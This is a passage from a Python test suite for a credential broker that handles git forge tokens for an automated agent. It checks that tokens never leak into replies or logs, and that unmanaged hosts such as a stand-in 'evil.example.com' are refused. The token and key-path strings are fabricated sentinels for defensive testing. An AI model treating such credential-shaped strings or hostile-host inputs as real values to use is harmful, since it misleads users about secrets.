        gives it nothing to branch on, so the gap is named in the body of a 200.
        """
        status, payload = self._handler(
            "/v1/vcs/capabilities",
            {"repository": "https://git.example.invalid/acme/infra"},
            self.broker(),
        )
        self.assertEqual(HTTPStatus.OK, status)
        self.assertEqual([], payload["verbs"])
        self.assertTrue(payload["missing"])

    def test_gits_stderr_never_reaches_the_caller(self):
        """git's stderr can carry a remote URL with a credential in it."""
        secret = "https://x-access-token:ghs_" + "q" * 36 + "@example.test/a/b"

        def explode(*args, **kwargs):
            raise subprocess.CalledProcessError(128, ["git", "clone"], "", secret)

        broker = self.broker(git_runner=explode)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs, mock.patch.object(
            credential_proxy, "managed_repositories", return_value=frozenset({"github:github.com/acme/infra"})
        ):
            status, payload = self._handler(
                "/v1/vcs/clone", {"repository": "acme/infra"}, broker
            )

        self.assertEqual(HTTPStatus.BAD_GATEWAY, status)
        self.assertEqual("GIT_FAILED", payload["code"])
        self.assertNotIn("ghs_", json.dumps(payload))
        # And what did reach the log is redacted, because that log is shipped.
        self.assertNotIn("ghs_" + "q" * 36, "\n".join(logs.output))

    def test_an_unexpected_error_says_nothing_about_itself(self):
        def explode(*args, **kwargs):
            raise ZeroDivisionError("/etc/broker/private-key.pem line 3")

        broker = self.broker(git_runner=explode)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"), mock.patch.object(
            credential_proxy, "managed_repositories", return_value=frozenset({"github:github.com/acme/infra"})
        ):
            status, payload = self._handler(
                "/v1/vcs/clone", {"repository": "acme/infra"}, broker
            )

        self.assertEqual(HTTPStatus.INTERNAL_SERVER_ERROR, status)
        self.assertNotIn("private-key", json.dumps(payload))

    def test_a_bundle_is_allowed_past_the_ordinary_request_ceiling(self):
        """`publish` carries a pack, which is larger than a JSON request.

        The broker has its own bundle ceiling and refuses with a named code
        above it. If the generic request limit bit first the caller would get
        an unexplained 400 instead.
        """
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.vcs = self.broker()
        handler.max_request_bytes = 1024
        oversized = json.dumps(
            {"repository": "acme/infra", "bundle": "A" * 4096}
        ).encode()
        handler.headers = {"Content-Length": str(len(oversized))}
        handler.rfile = io.BytesIO(oversized)
        handler.path = "/v1/vcs/publish"
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler._handle_vcs_post()

        self.assertNotEqual(
            "request exceeds configured size limit", replies[0][1].get("error")
        )

    def test_the_broker_is_built_unconditionally(self):
        """There is no off switch, and the roots are proven disjoint at boot."""
        broker = credential_proxy.build_vcs_broker(self.executor)
        self.assertIsNotNone(broker)
        self.assertTrue(broker.registry.forges)
        # Review round 3: the request slot's deadline is what the broker
        # hands every HTTP forge call; nothing pinned that it is handed over.
        self.assertEqual(self.executor.request_deadline, broker._request_deadline)

        overlapping = CommandExecutor.__new__(CommandExecutor)
        overlapping.vcs_root = self.executor.workspace_dir / "vcs"
        overlapping.workspace_dir = self.executor.workspace_dir
        with self.assertRaises(RuntimeError):
            credential_proxy.build_vcs_broker(overlapping)


class ContentWorkspaceOnGitLabTest(unittest.TestCase):
    """The content workspace end to end on a real two-forge registry: the real
    locate, the real credential selector, the real token-file credential, and
    a store recording every git call it makes."""

    TOKEN = "glpat-SENTINEL-must-never-appear"

    def setUp(self):
        import content_workspace
        self.cw = content_workspace
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.base = Path(tmp.name)
        token = self.base / "token"
        token.write_text(self.TOKEN)
        path = self.base / "forges.json"
        path.write_text(json.dumps({"forges": [
            {"provider": "github", "host": "github.com"},
            {"provider": "gitlab", "host": "gitlab.com", "tokenPath": str(token), "allowedPaths": ["acme"]},
        ]}))
        with mock.patch.dict(os.environ, {"VCS_FORGES_CONFIG": str(path)}):
            self.registry = credential_proxy.providers.Registry()
        self.managed = {"gitlab:gitlab.com/acme/infra", "github:github.com/acme/fleet"}
        self.context = {"gitlab:gitlab.com/acme/notes"}
        for patcher in (
            mock.patch.object(credential_proxy, "forge_registry", return_value=self.registry),
            mock.patch.object(credential_proxy, "managed_repositories", side_effect=lambda: frozenset(self.managed)),
            mock.patch.object(credential_proxy, "context_repositories", side_effect=lambda: frozenset(self.context)),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)
        (self.base / "data").mkdir()
        self.calls = []

        def runner(argv, cwd, config=()):
            self.calls.append((list(argv), tuple(config)))
            result = types.SimpleNamespace(exit_code=0, stdout="", stderr="")
            if "diff" in argv and "--cached" in argv:
                result.exit_code = 1
            return result

        self.store = content_workspace.ContentWorkspaceStore(
            self.base / "trees", self.base / "data", runner,
            credential_for=lambda repo: credential_proxy._workspace_credential(self.registry, repo),
            locate=credential_proxy._workspace_locate,
        )

    def _config_of(self, subcommand):
        return [config for argv, config in self.calls if argv[1] == subcommand]

    def _commit(self, handle):
        self.store.commit(
            handle, "platform-agent/change", "feat: a change",
            [self.cw.Change(self.cw.repo_relative("manifests/mine.yaml"), b"kind: Mine\n")],
        )

    def test_a_managed_gitlab_clone_carries_the_helper_scoped_to_its_host_and_never_the_token(self):
        workspace = self.store.open("gitlab.com/acme/infra")
        clone = next(argv for argv, _ in self.calls if argv[1] == "clone")
        self.assertIn("https://gitlab.com/acme/infra.git", clone)
        config = dict(self._config_of("clone")[0])
        self.assertEqual("", config["credential.helper"])
        self.assertIn("credential.https://gitlab.com.helper", config)
        self.assertNotIn(self.TOKEN, json.dumps(self.calls))
        self.assertEqual("gitlab.com/acme/infra", workspace.repo)

    def test_a_context_gitlab_repository_never_gets_the_write_token(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            workspace = self.store.open("gitlab.com/acme/notes")
        self.assertEqual([()], self._config_of("clone"))
        self.assertIsInstance(workspace.credential, credential_proxy.providers.NoCredential)
        self.assertIn("presents none", "\n".join(logs.output))

    def test_a_path_outside_allowed_paths_is_refused_at_open_and_at_the_gate(self):
        with self.assertRaises(self.cw.ContentWorkspaceError):
            self.store.open("gitlab.com/other/infra")
        self.assertEqual([], self._config_of("clone"))
        store = mock.Mock()
        store.get.return_value = mock.Mock(repo="gitlab.com/other/infra")
        with self.assertRaises(self.cw.RepositoryNotManaged):
            credential_proxy.require_managed_workspace(store, "h")

    def test_a_forge_the_install_names_but_has_no_credential_for_is_refused(self):
        path = self.base / "github-only.json"
        path.write_text(json.dumps({"forges": [{"provider": "github", "host": "github.com"}]}))
        with mock.patch.dict(os.environ, {"VCS_FORGES_CONFIG": str(path)}):
            github_only = credential_proxy.providers.Registry()
        with mock.patch.object(credential_proxy, "forge_registry", return_value=github_only):
            for refused in ("gitlab.com/acme/infra", "evil.example.com/acme/infra"):
                with self.subTest(refused=refused):
                    with self.assertRaises(self.cw.ContentWorkspaceError):
                        credential_proxy._workspace_locate(refused)

    def test_a_stored_token_is_withdrawn_when_the_repository_is_unregistered_after_open(self):
        workspace = self.store.open("gitlab.com/acme/infra")
        self.managed.discard("gitlab:gitlab.com/acme/infra")
        self.calls.clear()
        with self.assertRaises(self.cw.RepositoryNotManaged):
            credential_proxy.require_managed_workspace(self.store, workspace.handle)
        self._commit(workspace.handle)
        self.assertEqual([()], self._config_of("fetch"))

    def test_a_gitlab_push_carries_the_helper_and_a_github_push_carries_nothing(self):
        gitlab = self.store.open("gitlab.com/acme/infra")
        self._commit(gitlab.handle)
        self.calls.clear()
        self.store.push(gitlab.handle, "platform-agent/change")
        self.assertIn("credential.https://gitlab.com.helper", dict(self._config_of("push")[0]))
        github = self.store.open("acme/fleet")
        self.assertIsInstance(github.credential, credential_proxy.providers.NoCredential)
        self._commit(github.handle)
        self.calls.clear()
        self.store.push(github.handle, "platform-agent/change")
        self.assertEqual([()], self._config_of("push"))

    def test_a_github_handle_opened_as_context_pushes_on_the_ambient_credential(self):
        # Review: push carried the read mint's layer, which clears
        # `credential.helper`, so a repository promoted to managed after `open`
        # pushed with no credential at all.
        from providers.credentials import MintedReadCredential
        import content_workspace
        mint = MintedReadCredential("github", lambda provider, repo: "ghs_minted", "github.com")
        store = content_workspace.ContentWorkspaceStore(
            self.base / "trees2", self.base / "data",
            lambda argv, cwd, config=(): self.calls.append((list(argv), tuple(config)))
            or types.SimpleNamespace(exit_code=1 if ("diff" in argv and "--cached" in argv) else 0, stdout="", stderr=""),
            credential_for=lambda repo: mint,
        )
        workspace = store.open("acme/tf-live")
        store.commit(
            workspace.handle, "platform-agent/change", "feat: a change",
            [content_workspace.Change(content_workspace.repo_relative("m.yaml"), b"x\n")],
        )
        self.calls.clear()
        store.push(workspace.handle, "platform-agent/change")
        self.assertEqual([()], self._config_of("push"))


class TwoForgeInstallTest(unittest.TestCase):
    """Review: an install serving GitHub and GitLab has no one forge to default
    to, and the callers that held a bare GitHub name stopped working on it."""

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "forges.json"
        path.write_text(json.dumps({"forges": [
            {"provider": "github", "host": "github.com"},
            {"provider": "gitlab", "host": "gitlab.com", "tokenPath": "/t", "allowedPaths": []},
        ]}))
        for patcher in (
            mock.patch.dict(os.environ, {"VCS_FORGES_CONFIG": str(path)}),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)
        self.registry = credential_proxy.providers.Registry()
        self.assertIsNone(self.registry.default)
        for patcher in (
            mock.patch.object(credential_proxy, "forge_registry", return_value=self.registry),
            mock.patch.object(
                credential_proxy, "managed_repositories",
                return_value=frozenset({"github:github.com/acme/infra"}),
            ),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)

    def test_the_workspace_locates_a_host_qualified_repository_through_its_forge(self):
        self.assertEqual(
            ("gitlab.com/acme/infra", "https://gitlab.com/acme/infra.git"),
            credential_proxy._workspace_locate("gitlab.com/acme/infra"),
        )
        # GitHub's comes back as the bare name the store keys it by.
        self.assertEqual(
            ("acme/infra", "https://github.com/acme/infra.git"),
            credential_proxy._workspace_locate("github.com/acme/infra"),
        )
        import content_workspace
        for refused in ("evil.example.com/acme/infra", "bitbucket.org/acme/infra"):
            with self.subTest(refused=refused):
                with self.assertRaises(content_workspace.ContentWorkspaceError):
                    credential_proxy._workspace_locate(refused)

    def test_a_workspace_write_to_a_gitlab_repository_asks_that_forges_list(self):
        import content_workspace
        store = mock.Mock()
        managed = frozenset({"gitlab:gitlab.com/acme/infra"})
        with mock.patch.object(credential_proxy, "managed_repositories", return_value=managed):
            store.get.return_value = mock.Mock(repo="gitlab.com/acme/infra")
            credential_proxy.require_managed_workspace(store, "h")
            store.get.return_value = mock.Mock(repo="gitlab.com/acme/other")
            with self.assertRaises(content_workspace.RepositoryNotManaged):
                credential_proxy.require_managed_workspace(store, "h")
            store.get.return_value = mock.Mock(repo="evil.example.com/acme/infra")
            with self.assertRaises(content_workspace.RepositoryNotManaged):
                credential_proxy.require_managed_workspace(store, "h")

    def test_a_workspace_write_to_a_managed_github_repository_still_passes(self):
        store = mock.Mock()
        store.get.return_value = mock.Mock(repo="acme/infra")
        credential_proxy.require_managed_workspace(store, "h")
        store.get.return_value = mock.Mock(repo="acme/other")
        with self.assertRaises(Exception) as caught:
            credential_proxy.require_managed_workspace(store, "h")
        self.assertEqual("RepositoryNotManaged", type(caught.exception).__name__)

    def test_the_workspace_credential_resolves_a_bare_github_name_through_the_seam(self):
        # Review round 4: the cases above call `_hosted` directly, so dropping
        # it from `_workspace_credential` kept the suite green. Driven through
        # the production seam on the two-forge registry, the bare name has to
        # reach the role lookup on the GitHub forge.
        seen = []

        def role(repository, forge=None):
            seen.append((repository, forge.name if forge else None))
            return credential_proxy.ROLE_UNREGISTERED

        with mock.patch.object(credential_proxy, "repository_role", side_effect=role):
            credential_proxy._workspace_credential(self.registry, "acme/infra")
        self.assertEqual([("acme/infra", "github")], seen)

    def test_the_github_refresh_alias_accepts_an_older_images_bare_slug(self):
        # Review round 4: the alias branch was driven by no test. An older
        # agent image posts `{"repository": "owner/name"}` to
        # `/v1/github/refresh`; on a two-forge broker it has to refresh, not
        # be refused as hostless.
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.max_request_bytes = 10 * 1024 * 1024
        encoded = json.dumps({"repository": "acme/infra"}).encode()
        handler.headers = {"Content-Length": str(len(encoded))}
        handler.rfile = io.BytesIO(encoded)
        calls = []
        handler.executor = types.SimpleNamespace(
            refresh_forge_credential=lambda provider, repository, caller=None: calls.append((provider, repository))
        )
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler.log_message = lambda *args: None
        handler._handle_forge_refresh(provider="github")
        self.assertEqual([("github", "acme/infra")], calls)
        self.assertEqual(HTTPStatus.OK, replies[-1][0])

    def test_the_forge_neutral_refresh_lifts_a_bare_name_the_body_places(self):
        # Review (#2439): only the alias lifted; `/v1/forge/refresh` with
        # `{"provider": "github"}` in the body was refused as hostless.
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.max_request_bytes = 10 * 1024 * 1024
        encoded = json.dumps({"provider": "github", "repository": "acme/infra"}).encode()
        handler.headers = {"Content-Length": str(len(encoded))}
        handler.rfile = io.BytesIO(encoded)
        calls = []
        handler.executor = types.SimpleNamespace(
            refresh_forge_credential=lambda provider, repository, caller=None: calls.append((provider, repository))
        )
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler.log_message = lambda *args: None
        handler._handle_forge_refresh()
        self.assertEqual([("github", "acme/infra")], calls)
        self.assertEqual(HTTPStatus.OK, replies[-1][0])

    def test_the_lift_reads_hostless_as_the_parser_does_and_needs_one_forge(self):
        # Review (#2439): `_hosted` counted slashes, and took the first forge
        # carrying the provider.
        self.assertEqual("https://github.com/acme/infra", credential_proxy._hosted("acme/infra.git", "github"))
        self.assertEqual("github.com/acme", credential_proxy._hosted("github.com/acme", "github"))
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "forges.json"
        path.write_text(json.dumps({"forges": [
            {"provider": "gitlab", "host": "gitlab.com", "tokenPath": "/t", "allowedPaths": []},
            {"provider": "gitlab", "host": "gitlab.example.com", "tokenPath": "/u", "allowedPaths": []},
        ]}))
        with mock.patch.dict(os.environ, {"VCS_FORGES_CONFIG": str(path)}):
            two = credential_proxy.providers.Registry()
        with mock.patch.object(credential_proxy, "forge_registry", return_value=two):
            self.assertEqual("acme/infra", credential_proxy._hosted("acme/infra", "gitlab"))

    def test_a_pin_is_one_repository_on_one_forge_however_the_paths_coincide(self):
        # The pinned base names its host: on a broker serving GitHub and GitLab,
        # `acme/infra` on each is a different repository with its own base, a
        # nested GitLab path pins as the forge reads it, and `www.gitlab.com`
        # is gitlab.com.
        pins = credential_proxy.parse_pinned_bases(json.dumps([
            {"repository": "https://github.com/acme/infra", "branch": "release"},
            {"repository": "https://gitlab.com/acme/infra", "branch": "main"},
            {"repository": "https://www.gitlab.com/acme/platform/fleet", "branch": "stable"},
        ]))
        self.assertEqual({
            ("github.com", "acme/infra"): "release",
            ("gitlab.com", "acme/infra"): "main",
            ("gitlab.com", "acme/platform/fleet"): "stable",
        }, pins)
        pinned = credential_proxy.providers.pinned_base
        self.assertEqual("release", pinned(pins, "github.com", "acme/infra"))
        self.assertEqual("main", pinned(pins, "gitlab.com", "acme/infra"))
        self.assertEqual("stable", pinned(pins, "gitlab.com", "acme/platform/fleet"))
        self.assertIsNone(pinned(pins, "github.com", "acme/platform/fleet"))

    def _gitlab_only(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "forges.json"
        path.write_text(json.dumps({"forges": [
            {"provider": "gitlab", "host": "gitlab.com", "tokenPath": "/t", "allowedPaths": []},
        ]}))
        with mock.patch.dict(os.environ, {"VCS_FORGES_CONFIG": str(path)}):
            return credential_proxy.providers.Registry()

    def test_an_install_with_no_github_forge_refuses_a_workspace_write_as_not_managed(self):
        # Review round 2: it answered 503 "list unavailable", which is false
        # and invites a retry; the workspace has no forge to write through.
        store = mock.Mock()
        store.get.return_value = mock.Mock(repo="acme/infra")
        with mock.patch.object(credential_proxy, "forge_registry", return_value=self._gitlab_only()):
            with self.assertRaises(Exception) as caught:
                credential_proxy.require_managed_workspace(store, "h")
        self.assertEqual("RepositoryNotManaged", type(caught.exception).__name__)
        self.assertIn("serves github repositories only", str(caught.exception))

    def test_an_install_with_no_github_forge_clones_the_workspace_without_a_credential(self):
        with mock.patch.object(credential_proxy, "forge_registry", return_value=self._gitlab_only()), \
                self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential = credential_proxy._workspace_credential(self._gitlab_only(), "acme/infra")
        self.assertIsInstance(credential, providers.NoCredential)
        self.assertIn("serves no github forge", "\n".join(logs.output))

    def test_a_host_with_no_forge_answers_its_gap_not_nothing_to_refresh(self):
        # Review round 3: a GitHub-only install's placeholder for gitlab.com
        # carries no credential, and the route answered 200 "nothing to
        # refresh" for it.
        with mock.patch.dict(os.environ):
            os.environ.pop("VCS_FORGES_CONFIG", None)
            github_only = credential_proxy.providers.Registry()
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.max_request_bytes = 1 << 20
        body = json.dumps({"provider": "gitlab", "repository": "https://gitlab.com/acme/infra"}).encode()
        handler.headers = {"Content-Length": str(len(body))}
        handler.rfile = io.BytesIO(body)
        handler.executor = types.SimpleNamespace(
            refresh_forge_credential=lambda *a: self.fail("no refresh for a placeholder")
        )
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        with mock.patch.object(credential_proxy, "forge_registry", return_value=github_only), \
                mock.patch.object(
                    credential_proxy, "managed_repositories",
                    return_value=frozenset({"gitlab:gitlab.com/acme/infra"}),
                ):
            handler._handle_forge_refresh()
        self.assertEqual(1, len(replies))
        status, payload = replies[0]
        self.assertEqual(HTTPStatus.NOT_IMPLEMENTED, status)
        self.assertEqual("FORGE_UNSUPPORTED", payload["code"])

    def test_a_forge_with_nothing_to_refresh_says_so_instead_of_failing(self):
        # Review round 2: the route ran a helper GitLab does not ship and
        # answered 502 "credential refresh failed" on every call.
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.max_request_bytes = 1 << 20
        body = json.dumps({"provider": "gitlab", "repository": "https://gitlab.com/acme/infra"}).encode()
        handler.headers = {"Content-Length": str(len(body))}
        handler.rfile = io.BytesIO(body)
        handler.executor = types.SimpleNamespace(
            refresh_forge_credential=lambda *a: self.fail("no refresh for a stored token")
        )
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.com/acme/infra"}),
        ), self.assertNoLogs(credential_proxy.LOGGER, level="WARNING"):
            handler._handle_forge_refresh()
        self.assertEqual([(HTTPStatus.OK, {"status": "nothing to refresh", "forge": "gitlab"})], replies)
        executor = credential_proxy.CommandExecutor.__new__(credential_proxy.CommandExecutor)
        executor.execute_internal = lambda argv: self.fail("helper was run")
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"gitlab:gitlab.com/acme/infra"}),
        ):
            executor.refresh_forge_credential("gitlab", "acme/infra")

    def test_an_entry_typed_for_no_forge_here_is_named_once(self):
        # Review round 2: `GitLab` or `gitlab-selfmanaged` keyed silently and
        # admitted nothing, with nothing pointing at the entry.
        with mock.patch.object(credential_proxy, "_warned_repository_types", set()):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                credential_proxy._warn_on_unserved_types(
                    frozenset({"github:github.com/a/b", "GitLab:gitlab.com/a/b"})
                )
            self.assertEqual(1, len(logs.output))
            self.assertIn("'GitLab' match no forge", logs.output[0])
            with self.assertNoLogs(credential_proxy.LOGGER, level="WARNING"):
                credential_proxy._warn_on_unserved_types(frozenset({"GitLab:gitlab.com/c/d"}))

    def test_a_bare_name_the_caller_knows_the_forge_of_still_resolves(self):
        # The content workspace's read credential and the older images'
        # `/v1/github/refresh` both hold a bare GitHub name.
        lifted = credential_proxy._hosted("acme/infra", "github")
        self.assertEqual("https://github.com/acme/infra", lifted)
        forge, repo = self.registry.resolve(lifted)
        self.assertEqual(("github", "acme/infra"), (forge.name, repo))
        for unchanged in ("https://gitlab.com/a/b/c", "a/b/c", None):
            self.assertEqual(unchanged, credential_proxy._hosted(unchanged, "github"))
        self.assertEqual("acme/infra", credential_proxy._hosted("acme/infra", "bitbucket"))


class WorkspaceRouteTest(unittest.TestCase):
    """Two claims about the routes that a behavioural test cannot make.

    `WorkspaceGitPathTest` above asserts what the broker's git may do. These
    two are about the surface in front of it: that widening containment stayed
    a one-caller change, and that the route table refuses a name it does not
    know rather than falling through to the store.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        # The write verbs consult the managed-repository list, which reads a
        # ConfigMap through kubectl. Open by default here so that the routing
        # claims below are about routing; the gate has its own tests, which
        # patch over this one.
        gate = mock.patch.object(
            credential_proxy, "repository_is_managed", return_value=True
        )
        gate.start()
        self.addCleanup(gate.stop)

    def test_containment_root_has_exactly_one_caller(self):
        """A behavioural test cannot see a *new* caller added later. This can.

        If this fails because someone added a legitimate second caller, read
        `_execute`'s docstring before raising the number: the argument is safe
        because of who passes it, not because of what it does.
        """
        source = Path(credential_proxy.__file__).read_text(encoding="utf-8")
        callers = [
            line.strip()
            for line in source.splitlines()
            if "containment_root=" in line and "def _execute" not in line
        ]
        self.assertEqual(
            callers,
            [
                "containment_root=self.content_workspace_root,",
                # `execute_vcs_git` and `execute_forge_cli`. Both roots are the
                # broker's own scratch tree, which `assert_disjoint_roots`
                # proves at construction is somewhere the agent cannot name --
                # the same argument that admits the content workspace.
                "containment_root=self.vcs_root,",
                "containment_root=self.vcs_root,",
            ],
            f"unexpected containment_root callers: {callers}",
        )

    def _route(self, route, payload):
        store = mock.Mock()
        store.read.return_value = b""
        # Named, which is what keeps it out of `store.method_calls`: a Mock
        # assigned to an attribute is adopted as a child and has its calls
        # recorded unless it already carries a name. The write gate looks the
        # handle up before calling the store, and the assertions below are about
        # the call the route makes -- every one of them reads the first entry.
        store.get = mock.Mock(
            name="workspace_get", return_value=mock.Mock(repo="acme/fleet")
        )
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.workspaces = store
        handler._workspace_route(route, payload)
        return store

    def test_open_passes_a_host_qualified_name_to_the_store_and_still_refuses_a_bad_slug(self):
        import content_workspace
        store = self._route("open", {"repo": "gitlab.com/acme/platform/infra"})
        store.open.assert_called_once_with("gitlab.com/acme/platform/infra", None, None, None, caller=None)
        for bad in ("acme/..", "", None, 7):
            with self.subTest(bad=bad):
                with self.assertRaises(content_workspace.ContentWorkspaceError):
                    self._route("open", {"repo": bad})

    def test_open_hands_the_caller_label_to_the_store(self):
        store = self._route("open", {"repo": "acme/fleet", "caller": "t_f660e9c5"})
        store.open.assert_called_once_with("acme/fleet", None, None, None, caller="t_f660e9c5")
        # Paired: an open without one hands the store None, never "".
        store = self._route("open", {"repo": "acme/fleet"})
        store.open.assert_called_once_with("acme/fleet", None, None, None, caller=None)

    def test_the_write_verbs_gate_on_the_managed_repository_list(self):
        # The gate is on `commit` and `push` and not on `open`: opening is a
        # read, and `inspect-repository` opens repositories this install does
        # not manage on purpose. It raises rather than returning a reply tuple,
        # because the workspace routes answer through this exception family.
        import content_workspace

        for route, payload in (
            (
                "commit",
                {
                    "handle": "h",
                    "branch": "b",
                    "message": "m",
                    "changes": [{"path": "a.yaml", "delete": True}],
                },
            ),
            ("push", {"handle": "h", "branch": "b"}),
        ):
            with self.subTest(route=route):
                with mock.patch.object(
                    credential_proxy, "repository_is_managed", return_value=True
                ):
                    store = self._route(route, payload)
                self.assertIn(route, [call[0] for call in store.method_calls])

                with mock.patch.object(
                    credential_proxy, "repository_is_managed", return_value=False
                ):
                    with self.assertRaises(content_workspace.RepositoryNotManaged):
                        self._route(route, payload)

                # An unreadable list is not an unmanaged repository. Answering
                # 403 to a ConfigMap read that failed would tell an operator to
                # register a repository that is already registered.
                with mock.patch.object(
                    credential_proxy,
                    "repository_is_managed",
                    side_effect=RuntimeError("kubectl exited 1"),
                ):
                    with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                        with self.assertRaises(
                            content_workspace.ManagedRepositoriesUnavailable
                        ):
                            self._route(route, payload)

    def test_the_write_gate_reads_the_repository_off_the_handle(self):
        # Off the handle rather than off the request body, or a caller could
        # name a managed repository and write to the one it opened.
        store = mock.Mock()
        store.get.return_value = mock.Mock(repo="acme/unmanaged")
        seen = []
        with mock.patch.object(
            credential_proxy,
            "repository_is_managed",
            side_effect=lambda repo, forge=None: seen.append(repo) or True,
        ):
            credential_proxy.require_managed_workspace(store, "h")
        self.assertEqual(["acme/unmanaged"], seen)

    def test_the_open_route_does_not_consult_the_managed_repository_list(self):
        # Reading an upstream project is what `inspect-repository` is for, and
        # a gate here would refuse every one of them.
        with mock.patch.object(
            credential_proxy, "repository_is_managed", return_value=False
        ) as gate:
            store = self._route("open", {"repo": "kubernetes-sigs/kustomize"})
        gate.assert_not_called()
        self.assertEqual("open", store.method_calls[0][0])

    def test_the_read_verb_splits_on_paths_rather_than_on_a_second_route(self):
        # One verb, two shapes. Keyed on the presence of `paths` so that a
        # caller reading one file and a caller reading forty use one route --
        # and so that `paths: []` is the store's refusal to make, not the
        # router's silent fallback to the single-file read.
        self.assertEqual(
            [mock.call.read("h", "a.yaml")],
            self._route("read", {"handle": "h", "path": "a.yaml"}).method_calls,
        )
        for paths in (["a.yaml", "b.yaml"], []):
            with self.subTest(paths=paths):
                self.assertEqual(
                    [mock.call.read_many("h", paths)],
                    self._route(
                        "read", {"handle": "h", "path": "a.yaml", "paths": paths}
                    ).method_calls,
                )

    def test_the_branch_expectation_reaches_the_store(self):
        # Dropped here, the lease on the working branch is silently absent and
        # a maintainer's edit to the pull request is overwritten -- with
        # `--force-with-lease` unable to object, because it compares against
        # the tip being overwritten.
        store = self._route(
            "commit",
            {
                "handle": "h",
                "branch": "fix/x",
                "message": "m",
                "changes": [{"path": "a.yaml", "delete": True}],
                "expectedBaseSha": "b" * 40,
                "expectedBranchSha": "e" * 40,
            },
        )
        call = store.method_calls[0]
        self.assertEqual("commit", call[0])
        self.assertEqual(("h", "fix/x", "m"), call.args[:3])
        self.assertEqual(
            {"expected_base_sha": "b" * 40, "expected_branch_sha": "e" * 40},
            dict(call.kwargs),
        )
        # Absent means absent, not the empty string: the broker's own default
        # is what fills it in, and "" would read as "no expectation".
        store = self._route(
            "commit",
            {
                "handle": "h",
                "branch": "fix/x",
                "message": "m",
                "changes": [{"path": "a.yaml", "delete": True}],
            },
        )
        self.assertIsNone(store.method_calls[0].kwargs["expected_branch_sha"])

    def test_the_paging_and_search_arguments_reach_the_store(self):
        # Dropping `after` here would page forever on the first page, and
        # dropping `regex` would run a regex search as a fixed string and
        # answer "no matches" to a pattern that matches.
        self.assertEqual(
            [mock.call.list("h", "manifests", "manifests/a.yaml")],
            self._route(
                "list",
                {"handle": "h", "prefix": "manifests", "after": "manifests/a.yaml"},
            ).method_calls,
        )
        self.assertEqual(
            [mock.call.grep("h", "nginx", "manifests", regex=True, ignore_case=True)],
            self._route(
                "grep",
                {
                    "handle": "h",
                    "pattern": "nginx",
                    "prefix": "manifests",
                    "regex": True,
                    "ignoreCase": True,
                },
            ).method_calls,
        )
        # The flags are booleans on the wire, so a caller sending a truthy
        # string must not turn a fixed-string search into a regex one.
        self.assertEqual(
            [mock.call.grep("h", "a[", None, regex=False, ignore_case=False)],
            self._route(
                "grep", {"handle": "h", "pattern": "a[", "regex": "yes"}
            ).method_calls,
        )

    def test_an_unknown_verb_is_not_routed(self):
        # `_workspace_route` returns None for a name it does not know, and the
        # handler has to turn that into a 404. Reaching the store with an
        # unrecognised route would mean the dispatch is a fallthrough.
        store = mock.Mock()
        original = getattr(CredentialProxyHandler, "workspaces", None)
        CredentialProxyHandler.workspaces = store
        self.addCleanup(setattr, CredentialProxyHandler, "workspaces", original)
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.path = "/v1/workspace/exec"
        handler.max_request_bytes = 1 << 20
        handler.headers = {"Content-Length": "2"}
        handler.rfile = io.BytesIO(b"{}")
        answered = {}
        handler._json = lambda status, payload: answered.update(
            status=status, payload=payload
        )
        handler._handle_workspace_post()
        self.assertEqual(HTTPStatus.NOT_FOUND, answered["status"])
        self.assertFalse(store.method_calls)


class BackendSocketModeTest(unittest.TestCase):
    """The backend socket must not inherit a permissive umask.

    Nothing behind this socket authenticates its callers, so its mode is the
    second lock after the mount. The sidecar's entrypoint now sets `umask 0002`
    so that proxied commands leave group-writable files on the workspace the
    agent shares — and a group-writable *socket* is a connectable socket for
    anyone in the agent's group. `serve` therefore has to set the mode itself
    rather than take whatever the process umask happens to be, which is what
    this asserts by binding under the widest umask there is.
    """

    class _Stop(Exception):
        pass

    def setUp(self):
        # `serve` assigns these on the class; put them back for whatever runs
        # next. Some are bare annotations until something sets them, so an
        # unset one has to be unset again rather than restored.
        for attribute in ("policy", "executor", "enforce_read_only", "max_request_bytes"):
            self.addCleanup(
                self._restore,
                attribute,
                attribute in CredentialProxyHandler.__dict__,
                CredentialProxyHandler.__dict__.get(attribute),
            )

    @staticmethod
    def _restore(attribute, was_set, original):
        if was_set:
            setattr(CredentialProxyHandler, attribute, original)
        elif attribute in CredentialProxyHandler.__dict__:
            delattr(CredentialProxyHandler, attribute)

    def test_the_backend_socket_is_not_group_or_world_connectable(self):
        owner = self
        bound = []

        def stop(server):
            bound.append(server)
            raise owner._Stop

        class FakeThread:
            def __init__(self, *args, **kwargs):
                pass

            def start(self):
                pass

        with tempfile.TemporaryDirectory() as tmp:
            policy_path = Path(tmp) / "policy.json"
